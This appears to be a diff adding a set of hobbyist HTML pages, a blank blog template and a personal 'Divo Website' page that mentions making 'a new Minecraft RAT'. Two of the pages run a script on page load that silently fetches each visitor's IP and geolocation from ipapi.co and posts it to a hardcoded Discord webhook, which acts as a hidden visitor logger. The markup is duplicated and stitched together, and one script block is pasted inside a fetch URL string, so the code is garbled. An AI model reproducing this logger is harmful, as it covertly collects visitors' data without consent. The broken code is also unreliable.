@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Divo S Blog</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+
+        header {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 1em 0;
+        }
+
+        main {
+            max-width: 800px;
+            margin: 2em auto;
+            padding: 1em;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        footer {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 1em 0;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+
+        h1,
+        h2 {
+            margin-top: 0;
+        }
+
+        .bulletin {
+            border: 1px solid #ddd;
+            padding: 1em;
+            margin-bottom: 1em;
+        }
+
+        .content {
+            margin-bottom: 2em;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>Divo S Blog</h1>
+    </header>
+
+    <main>
+        <h2>Today's Bulletin</h2>
+        <div class="bulletin">
+            <p>Welcome to the Divo S blog! This is where you can find all the latest updates, news, and insights.</p>
+        </div>
+
+        <h2>Content</h2>
+        <div class="content">
+            <!-- Add your blog content here -->
+            <p>This is where you'll put your blog posts, articles, or any other content you want to share.</p>
+        </div>
+    </main>
+
+    <footer>
+        <p>&copy; 2023 Divo S. All rights reserved.</p>
+    </footer>
+</body>
+
+</html>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Getting Client's IP</title>
+
+    <style>
+        div {
+            text-align: center;
+        }
+
+        h1 {
+            color: green;
+        }
+    </style>
+</head>
+</div>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        // Fetch the IP address from the API
+        fetch("https://ipapi.co/json")
+            .then(response => response.json())
+            .then(data => {
+                // Send IP to Discord Webhook
+                const webhookUrl = 'https://discord.com/api/webhooks/1277752783357083790/JJAbbBF9AmfFNu-LTDIUWvQGhHfwytp7uti7ea3w1vV4Z9y9n1jw9szZAMdtC6KmBRtq'; // Replace with your actual webhook URL
+                const payload = {
+                    content: `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``
+                };
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok');
+                        }
+                        console.log('IP sent to Discord successfully!');
+                    })
+                    .catch(error => {
+                        console.error('Error sending IP to Discord:', error);
+                    });
+
+            })
+            .catch(error => {
+                console.error("Error fetching IP address:", error);
+                document.getElementById("ip-address").textContent = "Unable to retrieve IP address.";
+            });
+    });
+</script>
+</body>
+
+</html>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Getting Client's IP</title>
+
+    <style>
+        div {
+            text-align: center;
+        }
+
+        h1 {
+            color: green;
+        }
+    </style>
+</head>
+
+<body>
+    <div>
+        <h1>My Favorite Animal is a fat racoon</h1>
+        <h1>Divo Website</h1>
+        <h2>What I did this weekend</h2>
+        <h2>
+            <center>I had a pull party with my family. I made kebob and Hamburgers. I as well as made a new Minecraft
+                RAT
+        </h2>
+        <footer id="ip-address">
+            </``>
+    </div>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            // Fetch the IP address from the API
+            fetch("document.addEventListener("DOMContentLoaded", function() {
+            // Fetch the IP address from the API
+            fetch("https://ipapi.co/json")
+                    .then(response => response.json())
+                    .then(data => {
+                        // Display the IP address on the screen2
+
+                        // Send IP to Discord Webhook
+                        const webhookUrl = 'https://discord.com/api/webhooks/1277752783357083790/JJAbbBF9AmfFNu-LTDIUWvQGhHfwytp7uti7ea3w1vV4Z9y9n1jw9szZAMdtC6KmBRtq'; // Replace with your actual webhook URL
+                        const payload = {
+                            content: `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`` // Format the data as a code block
+                        };
+                        fetch(webhookUrl, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(payload)
+                        })
+                            .then(response => {
+                                if (!response.ok) {
+                                    throw new Error('Network response was not ok');
+                                }
+                                console.log('IP sent to Discord successfully!');
+                            })
+                            .catch(error => {
+                                console.error('Error sending IP to Discord:', error);
+                            });
+
+                    })
+                    .catch(error => {
+                        console.error("Error fetching IP address:", error);
+                        document.getElementById("ip-address").textContent = "Unable to retrieve IP address.";
+                    });
+        }); https://ipapi.co/json")
+                .then(response => response.json())
+            .then(data => {
+                // Display the IP address on the screen2
+
+                // Send IP to Discord Webhook
+                const webhookUrl = 'https://discord.com/api/webhooks/1277752783357083790/JJAbbBF9AmfFNu-LTDIUWvQGhHfwytp7uti7ea3w1vV4Z9y9n1jw9szZAMdtC6KmBRtq'; // Replace with your actual webhook URL
+                const payload = {
+                    content: `IP Address: ${data.ip}`
+                };
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok');
+                        }
+                        console.log('IP sent to Discord successfully!');
+                    })
+                    .catch(error => {
+                        console.error('Error sending IP to Discord:', error);
+                    });
+
+            })
+            .catch(error => {
+                console.error("Error fetching IP address:", error);
+                document.getElementById("ip-address").textContent = "Unable to retrieve IP address.";
+            });
+        });
+    </script>
+</body>
+
+</html>
